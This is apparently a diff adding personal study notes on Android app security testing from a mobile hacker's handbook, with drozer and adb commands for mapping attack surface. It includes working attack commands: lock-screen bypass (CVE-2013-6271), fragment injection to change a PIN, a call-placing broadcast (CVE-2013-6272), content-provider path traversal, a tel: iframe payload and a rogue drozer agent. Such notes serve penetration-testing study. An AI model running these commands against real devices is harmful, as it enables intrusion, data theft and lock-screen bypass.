@@ -1,0 +1,321 @@
+# the mobile application hacker's handbook
+
+jdk1.6
+
+alternatives to android's official emulator, such as genymotion) run x86 versions of Android and some applications that contain native code may not support this architecture. However, for exploring Android to understand how it works, they are useful and some may run quicker than the Google emulators. However, it is still the author’s preference to use the official Android emulator as it is always guaranteed to be unmodified.
+
+* Dalvik VM hello world (need jdk1.6). Dalvik later replaced by ART (Android Runtime) in Android 4.4 to improve speed
+$ javac Test.java
+$ dx –dex –output=test.jar Test.class
+
+* app installation process
+The installation process via the GTalkService was explored in an excellent blog post by Jon Oberheide at https://jon.oberheide.org/blog/2010/06/28/a‐peek‐ inside‐the‐gtalkservice‐connection/. The 
+
+adb install actually calls /system/bin/pm
+
+* key tools
+getprop This tool allows you to retrieve all system properties including verbose hardware and software information.
+dumpsys This tool displays information about the status of system services. If run without any arguments it iterates through all system services. You can also find these services by running service list.
+
+* drozer
+drozer agent build --permission android.permission.INSTALL_PACKAGES
+adb install /tmp/agent.apk
+adb forward tcp:31415 tcp:31415
+
+drozer console connect
+list package
+module search -d
+module install
+shell
+run app.package.info ‐h
+run app.package.info -a com.android.browser
+
+run app.package.list ‐p android.permission.READ_SMS
+run app.provider.info ‐p android.permission.READ_SMS
+
+run app.package.list ‐f "Terminal Emulator"
+
+* components
+kernel module /dev/binder (IPC)
+activity
+service (can be started or bound to)
+broadcast receiver (register for events)
+content provider (data storehouses, commonly sqlite)
+intent (implicit or explicit)
+run app.activity.start --action android.intent.action.VIEW --data‐uri http://www.google.com --component com.android.browser com.android.browser.BrowserActivity
+run app.provider.query content://settings/system
+
+* misc
+FORWARD_LOCK /data/app-private but since 4.1, apps are stored with .asec in /data/app‐asec and encrypted with device-specific key (/data/misc/systemkeys/AppsOnSD.sks)
+/data/dalvik-cache replaced by ART since 5.0
+/dev/socket/zygote
+protection level: signature 0x2 Indicates that this permission can only be granted to another application that was signed with the same certificate as the application that defined the permission.
+sharedUserId
+android sandbox == linux user/group perms + IPC calls to binder
+FDE only encrypts /data. Look for app storing sensitive data on sdcard. Some manufacturers have customized Android to include the encryption of the SD card.
+ODEX file can be converted to .dex using baksmali+smali
+OAT file still contains the original classes.dex file (use oat2dex), useful if original .apk is no longer avail on device.
+content providers exported by default on API<17 == <android 4.2
+
+# tools
+Jadx (dex to java decompiler)
+JEB (trial)
+
+# methodo
+* signature
+Third‐party applications that do not have any intention of sharing data or
+functionality with applications from other developers should always define
+permissions with the signature protection level. This ensures that another
+developer cannot write an application that requests your permission and
+gains access to your exported components. T
+
+* permissions
+by default /data/data/com.blah is o+x so make sure com.blah/* are all o-r
+requesting some permissions may get your application put in a certain group. For instance, inet when requesting android.permission .INTERNET. This means that accessing the network from an application would be governed by the OS’s native security checks and not binder.
+
+* review manifest
+aapt dump xmltree /path/to/agent.apk AndroidManifest.xml or aapt l -a /path/to/agent.apk
+java -jar AXMLPrinter2.jar AndroidManifest.xml
+run app.package.manifest com.mwr.dz > /data/local/tmp/manif.xml
+sharedUserId of android.uid.system? (effectively sets UID to 1000, a privileged context on a device)
+
+* exported components
+Even if activity does not have android:exported attribute if an intent filter is present, the activity is still exported.
+Code running as root or system can interact with any component and send intents to them even when they are not exported in their manifest. 
+Protection level signature ensures that only another application that was signed by the same certificate can interact with component.
+See Protection Level Downgrade Attack (install malicious app that defines and uses the Twitter app's permissions with normal level, when installing the Twitter app the perms will be normal instead of signature)
+<activity-alias> can also allow access to activities that are not exported (explicitly or through the use of intent filters), app.activity.info will list any aliases.
+activities can send info back to caller when they finish(). Checking whether an activity sends a result back is as simple as checking for the existence of the keyword setResult in the activity’s code. If the calling application started the activity using startActivityForResult()rather than startActivity() then the intent received from the started activity can be caught inside the overridden onActivityResult() callback.
+
+run app.package.attacksurface com.blah.app
+
+run app.broadcast.info -a 
+run app.provider.info -a
+run app.activity.info -a 
+run app.service.info -a
+use -u to list components that are not exported
+run app.package.launchintent com.blah.app #finds main activity (android.intent.action.MAIN)
+
+dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList # invoke another exported activity
+adb# am start -n com.mwr.example.sieve/.SettingsActivity
+adb $ am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task # CVE -2013-6271 lockscreen bypass <4.4
+
+* tapjacking
+grep -qr filterTouchesWhenObscured || echo vuln
+/!\ Some device vendors have mitigated tapjacking at an OS level. For instance, Samsung devices running Android versions Ice Cream Sandwich and later do not allow any touches to reach an underlying activity when there is a toast present on the screen, regardless of whether the filterTouchesWhenObscured attribute is set or not.
+
+* recent app screenshots
+
+* fragment injection
+All exported activities that extend PreferenceActivity and are running on Android 4.3 or prior are vulnerable. This attack was mitigated by Android in versions 4.4 onward by providing a new method in the PreferenceActivity class named isValidFragment() to allow developers to override it and validate which fragments can be loaded inside the activity
+
+change the PIN on a device running Android 4.3 or earlier
+run app.activity.start --component com.android.settings com.android.settings.Settings --extra string :android:show_fragment com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment --extra boolean confirmcredentials false
+
+* trust boundaries
+
+* unprotected content providers
+app targets API<17 but exported="false" is not explicitly stated
+
+run app.provider.finduri # checks only for strings inside that DEX file that begin with content:// (should not be relied upon)
+run app.provider.query com.blah.app
+content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords (can be run only from an ADB shell and not inside an application because it is protected by the android.permission.ACCESS_CONTENT_PROVIDERS_EXTERNALLY permission, which has a protection level of signature defined by the android package)
+
+- SQL injection
+
+- file-backed content providers
+dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/system/etc/hosts
+127.0.0.1 localhost
+dz> run app.provider.read content://com.shazam.android.AdMarvelCachedImageLocalFileContentProvider/../../../../../../../../system/etc/hosts
+dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/../../../../data/data/com.mwr.example.sieve/databases/database.db 
+
+run scanner.provider.traversal -a content://com.mwr.example.sieve.FileBackupProvider
+
+- pattern-matching flaws
+
+* unprotected started services
+Started services are ones that implement the onStartCommand() method inside its class. The code may perform an unsafe task even just by being started or may use parameters that are sent and when certain conditions take place, perform an unexpected action. 
+review src code
+dz> run app.service.start
+
+ClipboardSaveService on Samsung
+adb shell am startservice -a com.android.clipboardsaveservice.CLIPBOARD_SAVE_SERVICE --es copyPath /sdcard/bla --es pastePath /sdcard/restore/
+dz> run app.service.start --action com.android.clipboardsaveservice.CLIPBOARD_SAVE_SERVICE --extra string copyPath /sdcard/bla --extra string pastePath /sdcard/restore/
+
+- unprotected bound services
+review handleMessage()
+see book
+
+* unprotected broadcast receivers
+check if any have been registered at runtime with registerReceiver() (dz module wont find them)
+
+CVE -2013-6272 initiate or terminate phone calls <=4.4.2
+dz> run app.broadcast.send --component com.android.phone com.android.phone.PhoneGlobals$NotificationBroadcastReceiver --action com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION --data-uri tel:123456789
+
+- intent sniffing
+apps that broadcast intents containing sensitive and do not define required permissions that a broadcast receiver must hold or do not provide a destination package.
+search for sendBroadcast()
+dz> run app.broadcast.sniff --action android.intent.action.BATTERY_CHANGED
+
+- secret codes
+<html><iframe height ="1" src="tel:*%23*%234636%23*%23*"></iframe></html>
+
+* file and folder perms
+umask of 0077 since 4.0
+droidwall race condition
+
+* file encryption
+SQLCipher => grep for openOrCreateDatabase()
+hooking encryption key with Cydia Substrate (http://blog.mdsec.co.uk/2014/02/hooking-sqlcipher-crypto-keys-with.html)
+
+* sd card
+app storing files on sd card is exposing them to any app with android.permission.READ_EXTERNAL_STORAGE permission on <4.4
+whatsapp + static AES key
+
+* logging
+app with READ_LOGS on <4.1
+app logging to file on sdcard
+
+* insecure comms
+cleartext
+
+* webviews
+chromium since 4.4, webkit before
+a WebView still runs within the context of the application that it is embedded in
+is it loading over cleartext or insecure ssl
+
+grep -E addJavascriptInterface|WebView
+
+module install javascript
+run scanner.misc.checkjavascriptbridge -a
+
+* clipboard
+stores last 20 items in /data/clipboard/ (need jdeserialize)
+module install clipboard
+run post.capture.clipboard
+run post.perform.setclipboard mahh123
+
+* local sockets
+adb shell netstat -antp
+tcpdump -s0 -w /data/local/tmp/dump.cap
+adb shell "tcpdump -s 0 -w - | nc -l -p 4444"
+adb forward tcp:4444 tcp:4444
+nc localhost 4444 | sudo wireshark -k -S -i -
+
+* native code
+
+- attaching a debugger
+adb shell setprop debug.db.uid 10053
+adb shell gdbserver :5039 --attach 5345
+adb forward tcp:5039 tcp:5039
+$ android-ndk-r9d/toolchains/arm-linux-androideabi-4.8/prebuilt/linux-x86_64/bin/arm-linux-androideabigdb
+(gdb) target remote :5039
+
+* misconfigured application attributes
+
+- android:allowBackup (4.0+)
+true by default
+run app.package.backup -f com.blah.app
+review code if app extends BackupAgent
+
+adb backup com.blah.app # contains files stode in private data directory and on sdcard
+dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
+
+- android:debuggable
+false by default
+run app.package.debuggable
+
+* misc
+cert ssl pinning, root detection: patching apk or at runtime w/ Cydia Substrate (technically superior to Xposed Framework)
+runtime monitoring -> introspy
+
+grep -Eir 'token|key|secret'
+adb shell screencap -p | sed 's/\r$//' > screen.png
+
+# chapter 8 - identifying and exploiting android implementations issues
+* finding powerful apps
+run app.package.list -p android.permission.INSTALL_PACKAGES
+run app.package.list -u 1000
+
+* finding default document readers
+run app.activity.forintent --action android.intent.action.VIEW --mimetype application/pdf
+
+* browsable activities
+run scanner.activity.browsable (find all BROWSABLE activities or pass -a com.blah.app)
+android.intent.category.BROWSABLE : allows an activity to be invoked from a browser
+example:
+<a href="pwn://me">Start drozer - technique 1<a>
+<a href="intent://me/#Intent;scheme=pwn;end">Start Drozer - technique 2</a>
+used at Movile Pwn2Own via intent bypass on chrome to exploit activities that perform tasks automatically in their onCreate() using the supplied bundle.
+
+* custom update mechanisms
+apps that hold the INSTALL_PACKAGES permission
+
+* remote loading of code (i.e. reflection)
+loading over http or from dexPath or dexOutputDir specified can be replaced by malicious code.
+
+* webviews
+defining a Java/JavaScript interface.
+can I inject JavaScript at any time?
+
+* listening services
+
+* messaging applications
+application that handles data from external sources = possible entry point of attack
+
+* finding local vulns
+
+* rogue agent
+drozer agent build --rogue --server 192.168.1.112:80
+
+* what can an attacker do once he gets a $ shell
+attacker cannot invoke any Java libs (i.e. if app has READ_SMS, attacker wont have access to associated content providers)
+explore SD card if app uid is part of a group
+pm install if app has INSTALL_PACKAGES
+
+* adb
+usb debugging needs to be enabled
+since 4.2.2 there's a authorization popup however mwr found a bypass on 4.2.2-4.4.2 (popup would show after navigating to emergency dialer)
+<4.2 /data/local.prop owned by system would have ro.secure=1 (0 for root), but since 4.2 file replaced by /default.prop owned by root.
+Since 4.3 no file anymore but compile-time flag ALLOW_ADBD_ROOT so exploit requires to overwrite adbd.
+
+* unlocked bootloaders
+
+* disabling lock screen
+android.permission.DISABLE_KEYGUARD
+or removing .key file (storing the lock pattern) will entirely disable lock screen
+
+Gaining root access and removing a key file is possible if the victim has
+unlocked her bootloader and forgotten to lock it again
+
+* cracking pattern or password from their .key file
+
+* simulating user interaction
+input
+
+* extracting app data with physical access
+adb backup -all -shared
+
+# Version / API / Codename
+5.0               21 LOLLIPOP
+4.4W              20 KITKAT_WATCH
+4.4               19 KITKAT
+4.3               18 JELLY_BEAN_MR2
+4.2, 4.2.2        17 JELLY_BEAN_MR1
+4.1, 4.1.1        16 JELLY_BEAN
+4.0.3, 4.0.4      15 ICE_CREAM_SANDWICH_MR1
+4.0, 4.0.1, 4.0.2 14 ICE_CREAM_SANDWICH
+
+3.2 13 HONEYCOMB_MR2
+3.1.x 12 HONEYCOMB_MR1
+3.0.x 11 HONEYCOMB
+2.3.3, 2.3.4 10 GINGERBREAD_MR1
+2.3, 2.3.1, 2.3.2 9 GINGERBREAD
+2.2.x 8 FROYO
+2.1.x 7 ECLAIR_MR1
+2.0.1 6 ECLAIR_0_1
+2.0 5 ECLAIR
+1.6 4 DONUT
+1.5 3 CUPCAKE
+1.1 2 BASE_1_1
+1.0 1 BASE
